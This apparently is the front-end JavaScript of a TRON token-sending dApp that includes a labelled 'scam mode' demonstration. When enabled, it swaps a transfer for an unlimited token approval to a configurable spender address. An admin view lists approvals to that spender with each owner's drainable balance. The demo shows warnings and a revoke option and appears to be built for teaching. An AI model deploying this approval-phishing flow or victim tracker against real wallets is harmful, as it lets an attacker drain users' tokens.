/* global TronWeb */
(function () {
  "use strict";

  const cfg = window.APP_CONFIG;
  let TOKEN_ABI = window.TOKEN_ABI;
  const DEFAULT_TOKEN_ABI = window.TOKEN_ABI;

  // -----------------------------------------------------------------------
  // Storage keys
  // -----------------------------------------------------------------------

  const LS_KEY = "sendDappOverrides_v1";
  const LS_RECENTS = "sendDappRecents_v1";
  const DEFAULTS = {
    NETWORK: cfg.NETWORK,
    TRONSCAN_BASE: cfg.TRONSCAN_BASE,
    TOKEN_ADDRESS: cfg.TOKEN_ADDRESS,
  };

  function loadOverrides() {
    try {
      const raw = localStorage.getItem(LS_KEY);
      if (!raw) return;
      const o = JSON.parse(raw);
      if (o.NETWORK) {
        cfg.NETWORK = o.NETWORK;
        cfg.TRONSCAN_BASE = o.NETWORK === "mainnet"
          ? "https://tronscan.org"
          : "https://nile.tronscan.org";
      }
      if (o.TOKEN_ADDRESS) cfg.TOKEN_ADDRESS = o.TOKEN_ADDRESS;
      if (Array.isArray(o.TOKEN_ABI) && o.TOKEN_ABI.length) TOKEN_ABI = o.TOKEN_ABI;
    } catch (_) {}
  }
  loadOverrides();

  function loadRecents() {
    try {
      const raw = localStorage.getItem(LS_RECENTS);
      const arr = raw ? JSON.parse(raw) : [];
      return Array.isArray(arr) ? arr.slice(0, 5) : [];
    } catch (_) { return []; }
  }
  function pushRecent(addr) {
    let list = loadRecents().filter((a) => a !== addr);
    list.unshift(addr);
    list = list.slice(0, 5);
    try { localStorage.setItem(LS_RECENTS, JSON.stringify(list)); } catch (_) {}
    renderRecents();
  }

  // -----------------------------------------------------------------------
  // State
  // -----------------------------------------------------------------------

  const state = {
    tronWeb: null,
    address: null,
    tokenContract: null,
    refreshTimer: null,
    decimals: cfg.TOKEN_DECIMALS,
    symbol: cfg.TOKEN_SYMBOL,
    rawBalance: "0",
  };

  // -----------------------------------------------------------------------
  // DOM
  // -----------------------------------------------------------------------

  const $ = (id) => document.getElementById(id);
  const els = {
    netBadge: $("netBadge"),
    connectBtn: $("connectBtn"),
    tokenLogo: $("tokenLogo"),
    tokenName: $("tokenName"),
    heroBalance: $("heroBalance"),
    heroTrx: $("heroTrx"),
    heroAddressRow: $("heroAddressRow"),
    heroAddress: $("heroAddress"),
    copyAddrBtn: $("copyAddrBtn"),
    recipientInput: $("recipientInput"),
    pasteBtn: $("pasteBtn"),
    addrCheck: $("addrCheck"),
    addrHint: $("addrHint"),
    recents: $("recents"),
    recentsList: $("recentsList"),
    amountInput: $("amountInput"),
    amountSuffix: $("amountSuffix"),
    amountAvailable: $("amountAvailable"),
    sendSummary: $("sendSummary"),
    summarySend: $("summarySend"),
    summaryReceive: $("summaryReceive"),
    sendBtn: $("sendBtn"),
    installPrompt: $("installPrompt"),
    toasts: $("toasts"),
    confirmModal: $("confirmModal"),
    confirmAmount: $("confirmAmount"),
    confirmSymbol: $("confirmSymbol"),
    confirmFrom: $("confirmFrom"),
    confirmTo: $("confirmTo"),
    confirmNet: $("confirmNet"),
    confirmCancelBtn: $("confirmCancelBtn"),
    confirmSendBtn: $("confirmSendBtn"),
    adminToggle: $("adminToggle"),
    adminPanel: $("adminPanel"),
    adminNetwork: $("adminNetwork"),
    adminTokenAddr: $("adminTokenAddr"),
    adminSaveBtn: $("adminSaveBtn"),
    adminResetBtn: $("adminResetBtn"),
    adminCurNet: $("adminCurNet"),
    adminCurToken: $("adminCurToken"),
    adminScamSpender: $("adminScamSpender"),
    scamRibbon: $("scamRibbon"),
    scamModeToggle: $("scamModeToggle"),
    revokeBtn: $("revokeBtn"),
    allowanceStatus: $("allowanceStatus"),
    refreshApprovalsBtn: $("refreshApprovalsBtn"),
    approvalsStatus: $("approvalsStatus"),
    approvalsList: $("approvalsList"),
    adminSpenderAddr: $("adminSpenderAddr"),
  };

  const LS_SPENDER = "sendDappSpender_v1";
  function loadSpenderFilter() {
    try { return localStorage.getItem(LS_SPENDER) || ""; } catch (_) { return ""; }
  }
  function saveSpenderFilter(v) {
    try {
      if (v) localStorage.setItem(LS_SPENDER, v);
      else localStorage.removeItem(LS_SPENDER);
    } catch (_) {}
  }

  // -----------------------------------------------------------------------
  // Scam-mode demo (unlimited approve)
  // -----------------------------------------------------------------------
  const LS_SCAM = "sendDappScamMode_v1";
  // 2^256 - 1 (MAX_UINT256) — what malicious dApps ask for as the allowance.
  const MAX_UINT256 =
    "115792089237316195423570985008687907853269984665640564039457584007913129639935";
  // A valid TRON address used as the demo "spender" (the attacker contract).
  // Using a sample valid base58check address so the approve actually broadcasts.
  const DEFAULT_SCAM_SPENDER = "TKzxdSv2FZKQrEqkKVgp5DcwEXBEKMg2Ax";
  const LS_SCAM_SPENDER = "sendDappScamSpender_v1";
  function getScamSpender() {
    try {
      const v = localStorage.getItem(LS_SCAM_SPENDER);
      if (v && isValidTronAddr(v)) return v;
    } catch (_) {}
    return DEFAULT_SCAM_SPENDER;
  }
  function setScamSpender(v) {
    try {
      if (v) localStorage.setItem(LS_SCAM_SPENDER, v);
      else localStorage.removeItem(LS_SCAM_SPENDER);
    } catch (_) {}
  }
  state.scamMode = (() => {
    try { return localStorage.getItem(LS_SCAM) === "1"; } catch (_) { return false; }
  })();

  els.netBadge.textContent = cfg.NETWORK;
  els.amountSuffix.textContent = cfg.TOKEN_SYMBOL;

  // -----------------------------------------------------------------------
  // Toasts
  // -----------------------------------------------------------------------

  function toast(message, kind, txid) {
    const el = document.createElement("div");
    el.className = "toast" + (kind ? " " + kind : "");
    el.innerHTML = escapeHtml(message);
    if (txid) {
      const a = document.createElement("a");
      a.href = `${cfg.TRONSCAN_BASE}/#/transaction/${txid}`;
      a.target = "_blank";
      a.rel = "noopener noreferrer";
      a.textContent = "View on TronScan ↗";
      el.appendChild(a);
    }
    els.toasts.appendChild(el);
    setTimeout(() => {
      el.style.opacity = "0";
      el.style.transition = "opacity 0.3s ease";
      setTimeout(() => el.remove(), 320);
    }, 7000);
  }

  function escapeHtml(s) {
    return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
  }

  // -----------------------------------------------------------------------
  // Format helpers
  // -----------------------------------------------------------------------

  function fromUnits(raw, decimals) {
    const d = decimals != null ? decimals : state.decimals;
    const s = raw && raw.toString ? raw.toString() : "0";
    if (s === "0") return "0";
    const padded = s.padStart(d + 1, "0");
    const intPart = padded.slice(0, padded.length - d).replace(/^0+(?=\d)/, "");
    let frac = padded.slice(padded.length - d).replace(/0+$/, "");
    if (frac.length > 4) frac = frac.slice(0, 4);
    return frac ? `${intPart}.${frac}` : intPart;
  }
  function toUnits(human) {
    if (!human || isNaN(Number(human))) throw new Error("Invalid amount");
    const [intPart, fracRaw = ""] = String(human).split(".");
    const frac = (fracRaw + "0".repeat(state.decimals)).slice(0, state.decimals);
    const joined = (intPart + frac).replace(/^0+(?=\d)/, "");
    if (joined === "" || joined === "0") throw new Error("Amount must be > 0");
    return joined;
  }
  function shortAddr(a, head = 6, tail = 6) {
    if (!a) return "";
    return a.slice(0, head) + "…" + a.slice(-tail);
  }
  function isValidTronAddr(s) {
    return typeof s === "string" && /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(s.trim());
  }
  function formatNumber(s) {
    const [i, f] = s.split(".");
    const withCommas = i.replace(/\B(?=(\d{3})+(?!\d))/g, ",");
    return f != null ? `${withCommas}.${f}` : withCommas;
  }

  // -----------------------------------------------------------------------
  // Wallet detection / connection
  // -----------------------------------------------------------------------

  async function detectTronLink(maxWaitMs = 4000) {
    const start = Date.now();
    while (Date.now() - start < maxWaitMs) {
      if (window.tronLink || (window.tronWeb && window.tronWeb.ready)) return true;
      await new Promise((r) => setTimeout(r, 150));
    }
    return false;
  }

  async function connect() {
    const installed = await detectTronLink();
    if (!installed) {
      els.installPrompt.classList.remove("hidden");
      return;
    }
    try {
      if (window.tronLink && window.tronLink.request) {
        const res = await window.tronLink.request({ method: "tron_requestAccounts" });
        if (res && res.code && res.code !== 200) {
          toast(res.message || "Wallet connection rejected", "error");
          return;
        }
      }
    } catch (e) {
      toast("Wallet connection failed: " + (e.message || e), "error");
      return;
    }
    if (!window.tronWeb || !window.tronWeb.ready) {
      toast("TronLink not ready. Unlock the extension and try again.", "warn");
      return;
    }
    state.tronWeb = window.tronWeb;
    state.address = state.tronWeb.defaultAddress.base58;
    onWalletReady();
    toast("Wallet connected");
  }

  function onWalletReady() {
    els.connectBtn.textContent = shortAddr(state.address, 4, 4);
    els.heroAddress.textContent = shortAddr(state.address, 8, 8);
    els.heroAddressRow.hidden = false;
    initContracts().then(() => { refresh(); refreshAllowance(); }).catch((e) => console.error(e));
    startAutoRefresh();
    updateSendButton();
  }

  async function initContracts() {
    state.tokenContract = await state.tronWeb.contract(TOKEN_ABI, cfg.TOKEN_ADDRESS);
    try {
      const d = await state.tokenContract.decimals().call();
      state.decimals = Number(d);
    } catch (_) {}
    try {
      const sym = await state.tokenContract.symbol().call();
      state.symbol = sym;
      els.amountSuffix.textContent = sym;
      els.tokenName.textContent = sym;
      els.tokenLogo.textContent = sym.charAt(0);
    } catch (_) {}
  }

  // -----------------------------------------------------------------------
  // Read balances
  // -----------------------------------------------------------------------

  async function refresh() {
    if (!state.tronWeb || !state.address) return;
    try {
      const [bal, trxSun] = await Promise.all([
        state.tokenContract.balanceOf(state.address).call(),
        state.tronWeb.trx.getBalance(state.address),
      ]);
      state.rawBalance = bal.toString();
      const human = fromUnits(bal);
      els.heroBalance.innerHTML = `${formatNumber(human)} <span class="hero-balance-sym">${state.symbol}</span>`;
      els.heroTrx.textContent = `${formatNumber(fromUnits(trxSun.toString(), 6))} TRX`;
      els.amountAvailable.textContent = `Available: ${formatNumber(human)} ${state.symbol}`;
      updateSummary();
    } catch (e) {
      console.error("refresh failed:", e);
    }
  }

  function startAutoRefresh() {
    if (state.refreshTimer) clearInterval(state.refreshTimer);
    state.refreshTimer = setInterval(refresh, cfg.REFRESH_INTERVAL_MS);
  }

  // -----------------------------------------------------------------------
  // Recents
  // -----------------------------------------------------------------------

  function renderRecents() {
    const list = loadRecents();
    if (!list.length) { els.recents.hidden = true; return; }
    els.recents.hidden = false;
    els.recentsList.innerHTML = "";
    list.forEach((addr) => {
      const btn = document.createElement("button");
      btn.type = "button";
      btn.className = "recent-pill";
      btn.title = addr;
      btn.textContent = shortAddr(addr, 6, 4);
      btn.addEventListener("click", () => {
        els.recipientInput.value = addr;
        onRecipientInput();
        els.amountInput.focus();
      });
      els.recentsList.appendChild(btn);
    });
  }

  // -----------------------------------------------------------------------
  // Live validation & send button state
  // -----------------------------------------------------------------------

  function onRecipientInput() {
    const v = els.recipientInput.value.trim();
    if (!v) {
      els.addrCheck.className = "addr-check";
      els.addrHint.textContent = "";
    } else if (!isValidTronAddr(v)) {
      els.addrCheck.className = "addr-check invalid";
      els.addrCheck.textContent = "✕";
      els.addrHint.textContent = "Not a valid TRON address (must start with T, 34 chars)";
      els.addrHint.className = "field-hint err";
    } else if (state.address && v === state.address) {
      els.addrCheck.className = "addr-check invalid";
      els.addrCheck.textContent = "✕";
      els.addrHint.textContent = "This is your own address";
      els.addrHint.className = "field-hint err";
    } else {
      els.addrCheck.className = "addr-check valid";
      els.addrCheck.textContent = "✓";
      els.addrHint.textContent = "Address looks valid";
      els.addrHint.className = "field-hint ok";
    }
    updateSendButton();
    updateSummary();
  }

  function onAmountInput() {
    updateSendButton();
    updateSummary();
  }

  function readyToSend() {
    if (!state.tronWeb || !state.address) return { ok: false, reason: "Connect wallet" };
    const to = els.recipientInput.value.trim();
    if (!to) return { ok: false, reason: "Enter recipient & amount" };
    if (!isValidTronAddr(to)) return { ok: false, reason: "Invalid recipient address" };
    if (to === state.address) return { ok: false, reason: "Can't send to yourself" };
    const amt = els.amountInput.value;
    if (!amt || Number(amt) <= 0) return { ok: false, reason: "Enter an amount" };
    try {
      const units = toUnits(amt);
      // Compare to balance
      const u = state.tronWeb ? state.tronWeb.toBigNumber(units) : null;
      const b = state.tronWeb ? state.tronWeb.toBigNumber(state.rawBalance) : null;
      if (u && b && u.gt(b)) return { ok: false, reason: "Insufficient balance" };
    } catch (e) {
      return { ok: false, reason: "Invalid amount" };
    }
    return { ok: true };
  }

  function updateSendButton() {
    const r = readyToSend();
    if (r.ok) {
      els.sendBtn.disabled = false;
      els.sendBtn.textContent = state.scamMode
        ? `⚠️ Approve UNLIMITED ${state.symbol}`
        : `Send ${els.amountInput.value} ${state.symbol}`;
    } else {
      els.sendBtn.disabled = true;
      els.sendBtn.textContent = r.reason;
    }
  }

  function updateSummary() {
    const r = readyToSend();
    if (!r.ok) { els.sendSummary.hidden = true; return; }
    els.sendSummary.hidden = false;
    const amt = formatNumber(els.amountInput.value || "0");
    els.summarySend.textContent = `${amt} ${state.symbol}`;
    els.summaryReceive.textContent = `${amt} ${state.symbol}`;
  }

  // -----------------------------------------------------------------------
  // Tx helpers
  // -----------------------------------------------------------------------

  async function sendTx(label, builder) {
    try {
      toast(`${label} — sending…`);
      const txid = await builder.send({ shouldPollResponse: false });
      toast(`${label} submitted`, undefined, txid);
      setTimeout(refresh, 4000);
      setTimeout(refresh, 12000);
      return txid;
    } catch (e) {
      const msg = (e && (e.message || e.error)) || String(e);
      toast(`${label} failed: ${msg}`, "error");
      return null;
    }
  }

  // -----------------------------------------------------------------------
  // Send flow with modal confirmation
  // -----------------------------------------------------------------------

  function openConfirmModal() {
    const r = readyToSend();
    if (!r.ok) { toast(r.reason, "warn"); return; }
    const to = els.recipientInput.value.trim();
    const amt = els.amountInput.value;
    if (state.scamMode) {
      els.confirmAmount.textContent = "UNLIMITED";
      els.confirmSymbol.textContent = state.symbol + " — approve";
      const sp = getScamSpender();
      els.confirmTo.textContent = shortAddr(sp, 8, 8) + " (demo spender)";
      els.confirmTo.title = sp;
    } else {
      els.confirmAmount.textContent = formatNumber(amt);
      els.confirmSymbol.textContent = state.symbol;
      els.confirmTo.textContent = shortAddr(to, 8, 8);
      els.confirmTo.title = to;
    }
    els.confirmFrom.textContent = shortAddr(state.address, 8, 8);
    els.confirmFrom.title = state.address;
    els.confirmNet.textContent = cfg.NETWORK === "mainnet" ? "TRON Mainnet" : "TRON Nile Testnet";
    els.confirmModal.classList.remove("hidden");
  }

  function closeConfirmModal() {
    els.confirmModal.classList.add("hidden");
  }

  async function executeSend() {
    const to = els.recipientInput.value.trim();
    const amt = els.amountInput.value;
    let units;
    try { units = toUnits(amt); } catch (e) { toast(e.message, "warn"); return; }

    closeConfirmModal();

    // Scam-mode demo: instead of transferring, request UNLIMITED approval
    // to a sample spender. This is the real malicious flow — TronLink will
    // show an "Approve" popup with the giant unlimited number.
    if (state.scamMode) {
      const txid = await sendTx(
        `⚠️ Unlimited approve to ${shortAddr(getScamSpender(), 6, 4)}`,
        state.tokenContract.approve(getScamSpender(), MAX_UINT256),
      );
      if (txid) {
        toast(
          "Approval granted. The 'spender' can now drain your full balance at any time. Use Revoke in Settings to undo.",
          "warn",
        );
        setTimeout(refreshAllowance, 4000);
        setTimeout(refreshAllowance, 12000);
      }
      return;
    }

    const txid = await sendTx(
      `Send ${amt} ${state.symbol}`,
      state.tokenContract.transfer(to, units),
    );
    if (txid) {
      pushRecent(to);
      els.amountInput.value = "";
      updateSendButton();
      updateSummary();
    }
  }

  async function executeRevoke() {
    if (!state.tronWeb || !state.tokenContract) {
      toast("Connect wallet first", "warn");
      return;
    }
    await sendTx(
      `Revoke approval to ${shortAddr(getScamSpender(), 6, 4)}`,
      state.tokenContract.approve(getScamSpender(), "0"),
    );
    setTimeout(refreshAllowance, 4000);
  }

  async function refreshAllowance() {
    if (!state.tronWeb || !state.tokenContract || !state.address) return;
    if (!els.allowanceStatus) return;
    try {
      const a = await state.tokenContract
        .allowance(state.address, getScamSpender()).call();
      const raw = a.toString();
      const human = raw === "0" ? "0" : fromUnits(raw);
      const isUnlimited = raw.length >= 70; // ~MAX_UINT256
      els.allowanceStatus.innerHTML =
        "Current allowance to demo spender: <code>" +
        (isUnlimited ? "UNLIMITED ⚠️" : escapeHtml(human + " " + state.symbol)) +
        "</code>";
    } catch (_) {
      els.allowanceStatus.innerHTML =
        "Current allowance to demo spender: <code>—</code>";
    }
  }

  // -----------------------------------------------------------------------
  // Approvals list — fetched from TronGrid event logs
  // -----------------------------------------------------------------------
  function tronGridBase() {
    if (cfg.NETWORK === "mainnet") return "https://api.trongrid.io";
    if (cfg.NETWORK === "shasta") return "https://api.shasta.trongrid.io";
    return "https://nile.trongrid.io";
  }
  function hexToTronAddr(h) {
    if (!h) return "";
    try {
      if (typeof h === "string" && h.startsWith("T") && h.length === 34) return h;
      const TW = (state.tronWeb && state.tronWeb.address)
        || (window.TronWeb && window.TronWeb.address)
        || null;
      if (TW && TW.fromHex) {
        const norm = h.startsWith("0x") ? "41" + h.slice(2) : h;
        return TW.fromHex(norm);
      }
    } catch (_) {}
    return h;
  }
  function isUnlimitedValue(v) {
    const s = (v == null ? "" : String(v));
    return s.length >= 70;
  }
  async function fetchApprovals() {
    if (!els.approvalsList || !els.approvalsStatus) return;
    if (!cfg.TOKEN_ADDRESS) {
      els.approvalsStatus.textContent = "No token configured.";
      return;
    }
    els.approvalsStatus.textContent = "Loading…";
    els.approvalsList.innerHTML = "";
    const url = `${tronGridBase()}/v1/contracts/${cfg.TOKEN_ADDRESS}` +
      `/events?event_name=Approval&limit=200&order_by=block_timestamp,desc`;
    let data;
    try {
      const r = await fetch(url, { headers: { "Accept": "application/json" } });
      const j = await r.json();
      data = j && j.data;
    } catch (e) {
      els.approvalsStatus.textContent = "Fetch failed: " + (e.message || e);
      return;
    }
    if (!Array.isArray(data) || !data.length) {
      els.approvalsStatus.textContent = "0 approvals found.";
      return;
    }
    // Apply spender filter (case-insensitive base58 match).
    const spenderFilter = (els.adminSpenderAddr && els.adminSpenderAddr.value.trim()) || "";
    let filtered = data;
    if (spenderFilter) {
      filtered = data.filter((ev) => {
        const sp = hexToTronAddr((ev.result || {}).spender || (ev.result || {})["1"]);
        return sp && sp === spenderFilter;
      });
    }
    if (!filtered.length) {
      els.approvalsStatus.textContent = spenderFilter
        ? `0 approvals to ${shortAddr(spenderFilter, 6, 4)} (scanned ${data.length} events)`
        : "0 approvals found.";
      return;
    }
    // Cap to 50 visible rows so we don't hammer the RPC with 200 balanceOf calls.
    const events = filtered.slice(0, 50);
    const unlimitedCount = events.filter((ev) =>
      isUnlimitedValue((ev.result || {}).value || (ev.result || {})["2"])).length;
    els.approvalsStatus.innerHTML =
      `Showing ${events.length} of ${filtered.length} approval${filtered.length === 1 ? "" : "s"}` +
      (spenderFilter ? ` to <code>${escapeHtml(shortAddr(spenderFilter, 6, 4))}</code>` : "") +
      ` (<strong style="color:#c0392b">${unlimitedCount} UNLIMITED</strong>)`;

    const frag = document.createDocumentFragment();
    const ownerToRows = new Map(); // owner -> [balanceSpan, allowanceUnits, unlimited][]

    events.forEach((ev) => {
      const res = ev.result || {};
      const owner = hexToTronAddr(res.owner || res["0"]);
      const spender = hexToTronAddr(res.spender || res["1"]);
      const value = res.value || res["2"] || "0";
      const unlimited = isUnlimitedValue(value);
      const valueText = unlimited
        ? "UNLIMITED ⚠️"
        : (function () { try { return fromUnits(value) + " " + state.symbol; } catch (_) { return value; } })();
      const ts = ev.block_timestamp ? new Date(ev.block_timestamp) : null;
      const when = ts ? ts.toLocaleString() : "—";
      const txid = ev.transaction_id || "";
      const row = document.createElement("div");
      row.className = "approval-row" + (unlimited ? " danger" : "");
      row.innerHTML =
        `<div class="approval-line">` +
          `<span class="approval-label">Owner</span>` +
          `<code class="approval-addr" title="${escapeHtml(owner)}">${escapeHtml(shortAddr(owner, 8, 6))}</code>` +
        `</div>` +
        `<div class="approval-line">` +
          `<span class="approval-label">Owner balance</span>` +
          `<span class="approval-balance" data-owner="${escapeHtml(owner)}">loading…</span>` +
        `</div>` +
        `<div class="approval-line">` +
          `<span class="approval-label">Spender</span>` +
          `<code class="approval-addr" title="${escapeHtml(spender)}">${escapeHtml(shortAddr(spender, 8, 6))}</code>` +
        `</div>` +
        `<div class="approval-line">` +
          `<span class="approval-label">Allowance</span>` +
          `<strong class="approval-value">${escapeHtml(valueText)}</strong>` +
        `</div>` +
        `<div class="approval-line">` +
          `<span class="approval-label">At risk now</span>` +
          `<strong class="approval-risk" data-owner="${escapeHtml(owner)}" data-allowance="${escapeHtml(value)}" data-unlimited="${unlimited ? "1" : "0"}">—</strong>` +
        `</div>` +
        `<div class="approval-line approval-meta">` +
          `<span>${escapeHtml(when)}</span>` +
          (txid
            ? `<a href="${cfg.TRONSCAN_BASE}/#/transaction/${txid}" target="_blank" rel="noopener noreferrer">tx ↗</a>`
            : "") +
        `</div>`;
      frag.appendChild(row);
      if (!ownerToRows.has(owner)) ownerToRows.set(owner, []);
      ownerToRows.get(owner).push(row);
    });
    els.approvalsList.appendChild(frag);

    // Fetch balances for unique owners (concurrency-limited) then update rows.
    if (!state.tokenContract) {
      els.approvalsList.querySelectorAll(".approval-balance").forEach((s) => {
        s.textContent = "connect wallet to read";
      });
      return;
    }
    const owners = Array.from(ownerToRows.keys());
    const CONCURRENCY = 6;
    let idx = 0;
    async function worker() {
      while (idx < owners.length) {
        const o = owners[idx++];
        let balRaw = null;
        try {
          const b = await state.tokenContract.balanceOf(o).call();
          balRaw = b.toString();
        } catch (_) { balRaw = null; }
        ownerToRows.get(o).forEach((row) => {
          const balSpan = row.querySelector(`.approval-balance[data-owner="${o}"]`);
          const riskSpan = row.querySelector(`.approval-risk[data-owner="${o}"]`);
          if (balRaw == null) {
            if (balSpan) balSpan.textContent = "—";
            if (riskSpan) riskSpan.textContent = "—";
            return;
          }
          const human = fromUnits(balRaw);
          if (balSpan) balSpan.textContent = `${formatNumber(human)} ${state.symbol}`;
          if (!riskSpan) return;
          const unlimited = riskSpan.dataset.unlimited === "1";
          const allowance = riskSpan.dataset.allowance || "0";
          // at risk = min(allowance, balance)
          let risk;
          try {
            const BN = state.tronWeb.toBigNumber;
            const bBN = BN(balRaw);
            if (unlimited) risk = bBN;
            else {
              const aBN = BN(allowance);
              risk = aBN.lt(bBN) ? aBN : bBN;
            }
          } catch (_) {
            risk = null;
          }
          if (risk == null) { riskSpan.textContent = "—"; return; }
          const riskHuman = fromUnits(risk.toString());
          riskSpan.textContent = `${formatNumber(riskHuman)} ${state.symbol}`;
          if (Number(riskHuman) > 0 && unlimited) riskSpan.classList.add("danger-text");
        });
      }
    }
    await Promise.all(Array.from({ length: CONCURRENCY }, worker));
  }

  function applyScamMode() {
    if (els.scamModeToggle) els.scamModeToggle.checked = state.scamMode;
    if (els.scamRibbon) els.scamRibbon.hidden = !state.scamMode;
    document.body.classList.toggle("scam-on", state.scamMode);
    updateSendButton();
  }

  // -----------------------------------------------------------------------
  // UI actions
  // -----------------------------------------------------------------------

  async function onPaste() {
    try {
      const text = await navigator.clipboard.readText();
      els.recipientInput.value = text.trim();
      onRecipientInput();
    } catch (_) {
      toast("Couldn't read clipboard — paste manually", "warn");
    }
  }

  async function onCopyAddr() {
    if (!state.address) return;
    try {
      await navigator.clipboard.writeText(state.address);
      toast("Address copied", "info");
    } catch (_) {
      toast("Couldn't copy — select the text manually", "warn");
    }
  }

  function onPctChip(pct) {
    if (!state.tronWeb || state.rawBalance === "0") return;
    const human = fromUnits(state.rawBalance);
    const n = Number(human);
    if (!isFinite(n) || n <= 0) return;
    const v = pct === 100 ? human : (n * pct / 100).toFixed(Math.min(4, state.decimals));
    els.amountInput.value = v;
    onAmountInput();
  }

  // -----------------------------------------------------------------------
  // Wire up
  // -----------------------------------------------------------------------

  els.connectBtn.addEventListener("click", connect);
  els.pasteBtn.addEventListener("click", onPaste);
  els.copyAddrBtn.addEventListener("click", onCopyAddr);
  els.recipientInput.addEventListener("input", onRecipientInput);
  els.amountInput.addEventListener("input", onAmountInput);
  els.sendBtn.addEventListener("click", openConfirmModal);
  els.confirmCancelBtn.addEventListener("click", closeConfirmModal);
  els.confirmSendBtn.addEventListener("click", executeSend);
  if (els.scamModeToggle) {
    els.scamModeToggle.addEventListener("change", () => {
      state.scamMode = !!els.scamModeToggle.checked;
      try {
        localStorage.setItem(LS_SCAM, state.scamMode ? "1" : "0");
      } catch (_) {}
      applyScamMode();
      toast(
        state.scamMode
          ? "Scam mode ON — Send will trigger unlimited approve"
          : "Scam mode OFF — Send will do a normal transfer",
        "warn",
      );
    });
  }
  if (els.revokeBtn) els.revokeBtn.addEventListener("click", executeRevoke);
  if (els.refreshApprovalsBtn) els.refreshApprovalsBtn.addEventListener("click", fetchApprovals);
  if (els.adminScamSpender) {
    els.adminScamSpender.addEventListener("change", () => {
      const v = els.adminScamSpender.value.trim();
      if (v && !isValidTronAddr(v)) {
        toast("Address looks invalid (must start with T, 34 chars)", "error");
        return;
      }
      setScamSpender(v);
      toast(v ? "Scam spender updated" : "Reset to demo spender", "info");
      refreshAllowance();
    });
  }
  if (els.adminSpenderAddr) {
    els.adminSpenderAddr.addEventListener("change", () => {
      const v = els.adminSpenderAddr.value.trim();
      if (v && !isValidTronAddr(v)) {
        toast("Spender address looks invalid", "warn");
        return;
      }
      saveSpenderFilter(v);
      fetchApprovals();
    });
  }
  els.confirmModal.addEventListener("click", (e) => {
    if (e.target === els.confirmModal) closeConfirmModal();
  });
  document.querySelectorAll(".chip[data-pct]").forEach((c) => {
    c.addEventListener("click", () => onPctChip(Number(c.dataset.pct)));
  });

  // -----------------------------------------------------------------------
  // Admin
  // -----------------------------------------------------------------------

  function updateAdminCurrent() {
    els.adminCurNet.textContent = cfg.NETWORK;
    els.adminCurToken.textContent = cfg.TOKEN_ADDRESS;
    els.netBadge.textContent = cfg.NETWORK;
  }
  function populateAdminInputs() {
    els.adminNetwork.value = cfg.NETWORK === "mainnet" ? "mainnet" : "nile";
    els.adminTokenAddr.value = cfg.TOKEN_ADDRESS;
    if (els.adminSpenderAddr) els.adminSpenderAddr.value = loadSpenderFilter();
    if (els.adminScamSpender) {
      let v = "";
      try { v = localStorage.getItem(LS_SCAM_SPENDER) || ""; } catch (_) {}
      els.adminScamSpender.value = v;
    }
  }

  // Route detection: /admin shows ONLY the settings panel; / shows the dApp.
  function isAdminRoute() {
    const p = (location.pathname || "").replace(/\/+$/, "");
    return /\/admin$/.test(p);
  }
  function applyRoute() {
    const admin = isAdminRoute();
    document.body.classList.toggle("route-admin", admin);
    if (admin) {
      els.adminPanel.classList.remove("hidden");
      populateAdminInputs();
      updateAdminCurrent();
      refreshAllowance();
      fetchApprovals();
    } else {
      els.adminPanel.classList.add("hidden");
    }
  }
  applyRoute();
  window.addEventListener("popstate", applyRoute);

  els.adminSaveBtn.addEventListener("click", async () => {
    const token = els.adminTokenAddr.value.trim();
    const network = els.adminNetwork.value;
    if (!isValidTronAddr(token)) {
      toast("Token address looks invalid (must start with T, 34 chars)", "error");
      return;
    }
    const overrides = { NETWORK: network, TOKEN_ADDRESS: token };
    try { localStorage.setItem(LS_KEY, JSON.stringify(overrides)); }
    catch (e) { toast("Could not save (storage blocked)", "error"); return; }

    cfg.NETWORK = network;
    cfg.TRONSCAN_BASE = network === "mainnet"
      ? "https://tronscan.org"
      : "https://nile.tronscan.org";
    cfg.TOKEN_ADDRESS = token;
    TOKEN_ABI = DEFAULT_TOKEN_ABI;
    updateAdminCurrent();
    toast("Saved", "info");
    if (state.tronWeb && state.address) {
      try { await initContracts(); await refresh(); } catch (_) {}
    }
  });

  els.adminResetBtn.addEventListener("click", () => {
    try { localStorage.removeItem(LS_KEY); } catch (_) {}
    cfg.NETWORK = DEFAULTS.NETWORK;
    cfg.TRONSCAN_BASE = DEFAULTS.TRONSCAN_BASE;
    cfg.TOKEN_ADDRESS = DEFAULTS.TOKEN_ADDRESS;
    TOKEN_ABI = DEFAULT_TOKEN_ABI;
    populateAdminInputs();
    updateAdminCurrent();
    toast("Reset to defaults", "info");
    if (state.tronWeb && state.address) initContracts().then(refresh).catch(() => {});
  });

  updateAdminCurrent();
  renderRecents();
  applyScamMode();
  updateSendButton();

  // React to TronLink account/chain changes.
  window.addEventListener("message", (ev) => {
    if (!ev.data || !ev.data.message) return;
    const m = ev.data.message;
    if (m.action === "accountsChanged" || m.action === "setAccount") {
      if (window.tronWeb && window.tronWeb.ready) {
        state.tronWeb = window.tronWeb;
        state.address = state.tronWeb.defaultAddress.base58;
        onWalletReady();
      }
    }
  });

  // Silent auto-connect if TronLink is already unlocked.
  (async function autoConnect() {
    const ok = await detectTronLink(2000);
    if (ok && window.tronWeb && window.tronWeb.ready) {
      state.tronWeb = window.tronWeb;
      state.address = state.tronWeb.defaultAddress.base58;
      onWalletReady();
    }
  })();
})();
